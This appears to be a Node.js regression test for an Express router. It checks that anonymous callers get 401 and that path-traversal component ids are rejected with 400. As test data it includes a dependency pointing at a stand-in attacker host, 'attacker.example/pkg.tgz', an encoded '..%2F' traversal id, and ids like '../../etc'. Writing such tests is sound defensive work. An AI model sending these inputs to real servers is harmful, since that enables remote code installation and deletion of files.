/**
 * Component Designer router — authentication + component-id containment.
 *
 * Two defects this pins:
 *
 *   1. The router had no auth middleware at all. Its only mount-level gate is
 *      `requireCapability('component_designer')`, whose first line is
 *      `if (!req.session?.isAuthenticated) return next();` — it defers anonymous
 *      callers to an auth middleware that was never mounted in front of this
 *      router. Every route was therefore reachable with no session.
 *
 *   2. GET/PUT/DELETE /:id did `path.join(COMPONENTS_DIR, req.params.id)` with
 *      no validation, while POST / had always checked `/^[a-z0-9-]+$/`. Express
 *      decodes %2F inside a single path param, so `DELETE /..%2F..%2Ffoo`
 *      resolved outside the components tree and fs.rm(recursive, force) removed
 *      it.
 *
 * Run: cd server && node --test routes/components.authz.test.js
 */

const test = require('node:test');
const assert = require('node:assert');
const Module = require('module');
const fs = require('fs');
const os = require('os');
const path = require('path');

// ── Mutable fixtures ─────────────────────────────────────────────────
const fx = {
    authed: true,        // does the stubbed requireAuth let the request through
    installed: [],
    reloaded: [],
    removed: [],
};

const MOCKS = {
    // Stand-in for the real requireAuth: same contract (401 + `Not
    // authenticated` when there is no session user), no DB/Redis round-trip.
    '../auth/permissions': {
        requireAuth: (req, res, next) => {
            if (!fx.authed || !req.session?.user?.id) {
                return res.status(401).json({ error: 'Not authenticated' });
            }
            next();
        },
    },
    '../core/cms/componentManager': {
        getComponents: () => ({ 'demo-component': { name: 'Demo' } }),
        installComponent: async (id) => { fx.installed.push(id); },
        reloadComponent: async (id) => { fx.reloaded.push(id); },
        removeComponent: (id) => { fx.removed.push(id); },
    },
};
const MOCK_IDS = {};
for (const [request, exportsObj] of Object.entries(MOCKS)) {
    const mockId = `mock:components-authz:${request}`;
    MOCK_IDS[request] = mockId;
    require.cache[mockId] = { id: mockId, filename: mockId, loaded: true, exports: exportsObj };
}
const originalResolve = Module._resolveFilename;
Module._resolveFilename = function (request, parent, ...rest) {
    if (parent && /routes[\\/]components\.js$/.test(parent.filename)
        && Object.prototype.hasOwnProperty.call(MOCK_IDS, request)) {
        return MOCK_IDS[request];
    }
    return originalResolve.call(this, request, parent, ...rest);
};

const router = require('./components');
// The body schemas refuse by handing an error to the terminal handler, so the
// harness answers one the way index.js does.
const { terminalErrorHandler } = require('../core/http/terminalErrorHandler');

test.after(() => { Module._resolveFilename = originalResolve; });

function resetFx() {
    fx.authed = true;
    fx.installed.length = 0;
    fx.reloaded.length = 0;
    fx.removed.length = 0;
}

function dispatch({ method, url, body = {}, session }) {
    return new Promise((resolve, reject) => {
        const req = { method, url, originalUrl: url, path: url, body, headers: {}, session, query: {}, get() { return undefined; } };
        const res = {
            statusCode: 200,
            headersSent: false,
            status(c) { this.statusCode = c; return this; },
            json(b) { this.body = b; this.headersSent = true; resolve(this); return this; },
            send(b) { this.body = b; this.headersSent = true; resolve(this); return this; },
            end() { this.headersSent = true; resolve(this); return this; },
            setHeader() { return this; },
        };
        router(req, res, (err) => {
            if (!err) return reject(new Error(`fell through: ${method} ${url}`));
            terminalErrorHandler(err, req, res, (e) => reject(e));
        });
    });
}

const ALICE = { isAuthenticated: true, user: { id: 'alice' } };
const COMPONENTS_DIR = path.resolve(__dirname, '../../components');

// ═══ 1. Nothing is reachable without a session ═══════════════════════

const ANON_ROUTES = [
    ['GET', '/'],
    ['POST', '/'],
    ['GET', '/demo-component'],
    ['PUT', '/demo-component'],
    ['DELETE', '/demo-component'],
];

for (const [method, url] of ANON_ROUTES) {
    test(`${method} ${url} is 401 for an anonymous caller`, async () => {
        resetFx();
        const res = await dispatch({ method, url, body: { id: 'pwn' }, session: undefined });
        assert.strictEqual(res.statusCode, 401);
        assert.deepStrictEqual(fx.installed, [], 'no npm install was driven');
        assert.deepStrictEqual(fx.removed, [], 'nothing was removed');
    });
}

test('POST / cannot drive componentManager.installComponent anonymously', async () => {
    resetFx();
    const res = await dispatch({
        method: 'POST',
        url: '/',
        body: { id: 'pwn', dependencies: { evil: 'https://attacker.example/pkg.tgz' } },
        session: undefined,
    });
    assert.strictEqual(res.statusCode, 401);
    assert.deepStrictEqual(fx.installed, []);
    assert.ok(!fs.existsSync(path.join(COMPONENTS_DIR, 'pwn')), 'no component directory was created');
});

// ═══ 2. Traversal out of COMPONENTS_DIR is rejected ══════════════════

test('DELETE /:id cannot path-traverse out of COMPONENTS_DIR', async () => {
    resetFx();
    const victimRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'components-authz-'));
    const victimDir = path.join(victimRoot, 'precious');
    fs.mkdirSync(victimDir);
    fs.writeFileSync(path.join(victimDir, 'keep.txt'), 'important');

    // The id an attacker supplies as `DELETE /components/..%2F..%2F…` — Express
    // decodes %2F inside a single param, so this is what req.params.id becomes.
    const traversalId = path.relative(COMPONENTS_DIR, victimDir);
    assert.ok(traversalId.startsWith('..'), 'fixture really is outside the components tree');

    try {
        const res = await dispatch({ method: 'DELETE', url: `/${encodeURIComponent(traversalId)}`, session: ALICE });
        assert.strictEqual(res.statusCode, 400);
        assert.match(res.body.error, /Invalid component ID/);
        assert.ok(fs.existsSync(victimDir), 'the directory outside COMPONENTS_DIR still exists');
        assert.ok(fs.existsSync(path.join(victimDir, 'keep.txt')), 'and so do its contents');
        assert.deepStrictEqual(fx.removed, []);
    } finally {
        fs.rmSync(victimRoot, { recursive: true, force: true });
    }
});

const BAD_IDS = [
    '../server',
    '../../etc',
    '..',
    '.',
    'foo/bar',
    'foo\\bar',
    'Uppercase',
    'has space',
    'dot.dot',
    '',
];

for (const badId of BAD_IDS) {
    // '' collapses the URL to '/' (the list route), so exercise it via POST only.
    if (badId === '') continue;
    test(`DELETE rejects id ${JSON.stringify(badId)} with 400`, async () => {
        resetFx();
        const res = await dispatch({ method: 'DELETE', url: `/${encodeURIComponent(badId)}`, session: ALICE });
        assert.strictEqual(res.statusCode, 400, `expected 400 for ${JSON.stringify(badId)}`);
        assert.deepStrictEqual(fx.removed, []);
    });

    test(`GET rejects id ${JSON.stringify(badId)} with 400`, async () => {
        resetFx();
        const res = await dispatch({ method: 'GET', url: `/${encodeURIComponent(badId)}`, session: ALICE });
        assert.strictEqual(res.statusCode, 400, `expected 400 for ${JSON.stringify(badId)}`);
    });

    test(`PUT rejects id ${JSON.stringify(badId)} with 400`, async () => {
        resetFx();
        const res = await dispatch({ method: 'PUT', url: `/${encodeURIComponent(badId)}`, body: { code: 'x' }, session: ALICE });
        assert.strictEqual(res.statusCode, 400, `expected 400 for ${JSON.stringify(badId)}`);
        assert.deepStrictEqual(fx.installed, []);
        assert.deepStrictEqual(fx.reloaded, []);
    });

    test(`POST rejects id ${JSON.stringify(badId)} with 400`, async () => {
        resetFx();
        const res = await dispatch({ method: 'POST', url: '/', body: { id: badId }, session: ALICE });
        assert.strictEqual(res.statusCode, 400, `expected 400 for ${JSON.stringify(badId)}`);
        assert.deepStrictEqual(fx.installed, []);
    });
}

test('POST rejects an empty / missing id with 400', async () => {
    resetFx();
    for (const id of ['', null, undefined, 123, {}]) {
        const res = await dispatch({ method: 'POST', url: '/', body: { id }, session: ALICE });
        assert.strictEqual(res.statusCode, 400, `expected 400 for ${JSON.stringify(id)}`);
    }
    assert.deepStrictEqual(fx.installed, []);
});

// ═══ 3. Well-formed ids still work ═══════════════════════════════════

test('a well-formed id is still accepted (404 from the filesystem, not 400)', async () => {
    resetFx();
    const res = await dispatch({ method: 'DELETE', url: '/no-such-component-9', session: ALICE });
    assert.strictEqual(res.statusCode, 404, 'valid shape reaches the filesystem check');
    assert.strictEqual(res.body.error, 'Component not found');
});

test('GET / still lists components for an authenticated caller', async () => {
    resetFx();
    const res = await dispatch({ method: 'GET', url: '/', session: ALICE });
    assert.strictEqual(res.statusCode, 200);
    assert.ok(res.body['demo-component'], 'the componentManager listing is returned');
});
